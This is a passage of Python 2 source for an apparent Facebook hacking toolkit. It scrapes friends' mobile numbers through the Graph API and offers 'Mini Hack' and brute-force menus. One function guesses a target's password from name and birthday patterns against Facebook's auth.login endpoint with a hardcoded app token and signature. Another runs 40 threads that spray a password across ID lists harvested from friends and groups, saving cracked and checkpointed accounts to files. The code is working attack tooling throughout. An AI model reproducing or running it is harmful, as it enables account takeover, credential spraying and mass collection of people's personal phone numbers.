		url= "https://graph.facebook.com/me/friends?access_token="+fb_token

		r =requests.get(url)

		z=json.loads(r.text)

		make_action = open('out/nomer_friends.txt','w')

		for n in z["data"]:

			x = requests.get("https://graph.facebook.com/"+n['id']+"?access_token="+fb_token)

			z = json.loads(x.text)

			try:

				hp.append(z['mobile_phone'])

				make_action.write(z['mobile_phone'] + '\n')

				print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)

			except KeyError:

				pass

		make_action.close()

		print 42*"\033[1;97m═"

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/nomer_friends.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### PHONE NUMBER FROM FRIENDS #####

def phone_number_from_friends():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		os.system('clear')

		print logo

		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")

		try:

			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)

			op = json.loads(seat.text)

			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]

		except KeyError:

			print"\033[1;91m[!] Friend not found"

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			dump()

		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)

		a = json.loads(r.text)

		jalan('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')

		print 42*"\033[1;97m═"

		make_action = open('out/no_friends_from_friends.txt','w')

		for i in a['data']:

			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)

			z = json.loads(x.text)

			try:

				hpfromfriends.append(z['mobile_phone'])

				make_action.write(z['mobile_phone'] + '\n')

				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)

			except KeyError:

				pass

		make_action.close()

		print 42*"\033[1;97m═"

		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'

		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromfriends))

		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")

		os.rename('out/no_friends_from_friends.txt','out/'+done)

		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except IOError:

		print"\033[1;91m[!] Error creating file"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except (KeyboardInterrupt,EOFError):

		print("\033[1;91m[!] Stopped")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except KeyError:

		print('\033[1;91m[!] Error')

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		dump()

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

		failed()

##### MENU HACK #####

def menu_hack():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	os.system('clear')

	print logo

	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"

	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Multi Bruteforce Facebook"

	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Super Multi Bruteforce Facebook"

	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m BruteForce(\033[1;92mTarget\033[1;97m)"

	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Yahoo Checker"

	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"

	print "║"

	choose_hack()

#----choices

def choose_hack():

	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")

	if hack=="":

		print "\033[1;91m[!] Wrong input"

		choose_hack()

	elif hack =="1":

		mini()

	elif hack =="2":

		crack()

		success()

	elif hack =="3":

		super()

	elif hack =="4":

		brute()

	elif hack =="5":

		menu_yahoo()

	elif hack =="0":

		menu()

	else:

		print "\033[1;91m[!] Wrong input"

		choose_hack()

##### MINI HF #####

def mini():

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.01)

		login()

	os.system('clear')

	print logo

	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"

	print 42*"\033[1;97m═"

	try:

		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")

		jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')

		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)

		a = json.loads(r.text)

		print '\033[1;91m[➹] \033[1;92mName\033[1;97m : '+a['name']

		jalan('\033[1;91m[+] \033[1;92mCheck \033[1;97m...')

		time.sleep(2)

		jalan('\033[1;91m[+] \033[1;92mOpen password \033[1;97m...')

		time.sleep(2)

		print 42*"\033[1;97m═"

		pz1 = a['first_name']+'123'

		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

		y = json.load(data)

		if 'access_token' in y:

			print "\033[1;91m[+] \033[1;92mFound"

			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			menu_hack()

		else:

			if 'www.facebook.com' in y["error_msg"]:

				print "\033[1;91m[+] \033[1;92mFound"

				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"

				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1

				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

				menu_hack()

			else:

				pz2 = a['first_name'] + '12345'

				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

				y = json.load(data)

				if 'access_token' in y:

					print "\033[1;91m[+] \033[1;92mFound"

					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2

					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

					menu_hack()

				else:

					if 'www.facebook.com' in y["error_msg"]:

						print "\033[1;91m[+] \033[1;92mFound"

						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"

						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2

						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

						menu_hack()

					else:

						pz3 = a['last_name'] + '123'

						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

						y = json.load(data)

						if 'access_token' in y:

							print "\033[1;91m[+] \033[1;92mFound"

							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3

							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

							menu_hack()

						else:

							if 'www.facebook.com' in y["error_msg"]:

								print "\033[1;91m[+] \033[1;92mFound"

								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"

								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3

								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

								menu_hack()

							else:

								lahir = a['birthday']

								pz4 = lahir.replace('/', '')

								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

								y = json.load(data)

								if 'access_token' in y:

									print "\033[1;91m[+] \033[1;92mFound"

									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4

									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

									menu_hack()

								else:

									if 'www.facebook.com' in y["error_msg"]:

										print "\033[1;91m[+] \033[1;92mFound"

										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"

										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4

										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

										menu_hack()

									else:

										lahirs = a['birthday']

										gaz = lahirs.replace('/', '')

										pz5 = a['first_name']+ '1234'

										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

										y = json.load(data)

										if 'access_token' in y:

											print "\033[1;91m[+] \033[1;92mFound"

											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5

											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

											menu_hack()

										else:

											if 'www.facebook.com' in y["error_msg"]:

												print "\033[1;91m[+] \033[1;92mFound"

												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"

												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5

												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

												menu_hack()

											else:

												pz6 = "India123"

												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

												y = json.load(data)

												if 'access_token' in y:

													print "\033[1;91m[+] \033[1;92mFound"

													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6

													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

													menu_hack()

												else:

													if 'www.facebook.com' in y["error_msg"]:

														print "\033[1;91m[+] \033[1;92mFound"

														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"

														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6

														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

														menu_hack()

													else:

														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"

														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

														y = json.load(data)

														if 'access_token' in y:

															print "\033[1;91m[+] \033[1;92mFound"

															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7

															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

															menu_hack()

														else:

															if 'www.facebook.com' in y["error_msg"]:

																print "\033[1;91m[+] \033[1;92mFound"

																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"

																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']

																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id

																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6

																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

																menu_hack()

															else:

																print "\033[1;91m[!] Sorry, failed to open the target password :("

																print "\033[1;91m[!] try it another way."

																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

																menu_hack()

	except KeyError:

		print "\033[1;91m[!] Terget not found"

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		menu_hack()

##### Multi Brute Force #####

##### CRACK ####

def crack():

	global idlist,passw,file

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')

	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')

	try:

		file = open((idlist), "r")

		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')

		for x in range(40):

			pick = threading.Thread(target=scrak, args=())

			pick.start()

			threads.append(pick)

		for pick in threads:

			pick.join()

	except IOError:

		print ("\033[1;91m[!] File not found")

		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

		menu_hack()

def scrak():

	global sucessful,checkpoint,action_failed,back,up

	try:

		os.mkdir('out')

	except OSError:

		pass

	try:

		open_it = open(idlist, "r")

		up = open_it.read().split()

		while file:

			username = file.readline().strip()

			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"

			data = urllib.urlopen(url)

			mpsh = json.load(data)

			if back == (len(up)):

				break

			if 'access_token' in mpsh:

				bisa = open("out/mbf_ok.txt", "w")

				bisa.write(username+"|"+passw+"\n")

				bisa.close()

				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])

				z = json.loads(x.text)

				sucessful.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])

			elif 'www.facebook.com' in mpsh["error_msg"]:

				cek = open("out/mbf_cp.txt", "w")

				cek.write(username+"|"+passw+"\n")

				cek.close()

				checkpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)

			else:

				action_failed.append(username)

				back +=1

			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack    \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(sucessful))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(checkpoint)));sys.stdout.flush()

	except IOError:

		print"\n\033[1;91m[!] Sleep"

		time.sleep(0.01)

	except requests.exceptions.ConnectionError:

		print"\033[1;91m[✖] No connection"

def success():

	print

	print 42*"\033[1;97m═"

	###sucessful

	for b in sucessful:

		print(b)

	###CEK

	for c in checkpoint:

		print(c)

	###action_failed

	print 42*"\033[1;97m═"

	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(action_failed)))

	failed()

############### SUPER MBF ################

def super():

	global fb_token

	os.system('clear')

	try:

		fb_token=open('login.txt','r').read()

	except IOError:

		print"\033[1;91m[!] Token not found"

		os.system('rm -rf login.txt')

		time.sleep(0.0)

		login()

	os.system('clear')

	print logo

	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack with list friend"

	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack from friend"

	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack from member group"

        print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Crack from File"

	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"

	print "║"

	choices_super()

def choices_super():

	peak = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")

	if peak =="":

		print "\033[1;91m[!] Wrong input"

		choices_super()

	elif peak =="1":

		os.system('clear')

		print logo

		jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)

		z = json.loads(r.text)

		for s in z['data']:

			id.append(s['id'])

	elif peak =="2":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")

		try:

			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)

			op = json.loads(seat.text)

			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]

		except KeyError:

			print"\033[1;91m[!] Friend not found"

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			super()

		jalan('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+fb_token)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

	elif peak =="3":

		os.system('clear')

		print logo

		idg=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')

		try:

			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+fb_token)

			asw=json.loads(r.text)

			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']

		except KeyError:

			print"\033[1;91m[!] Group not found"

			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")

			super()

		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')

		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+fb_token)

		s=json.loads(re.text)

		for p in s['data']:

			id.append(p['id'])

        elif peak == "4":

                os.system('clear')

                print logo

                try:

                        idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')

                        for line in open(idlist,'r').readlines():

                                id.append(line.strip())

                except KeyError:
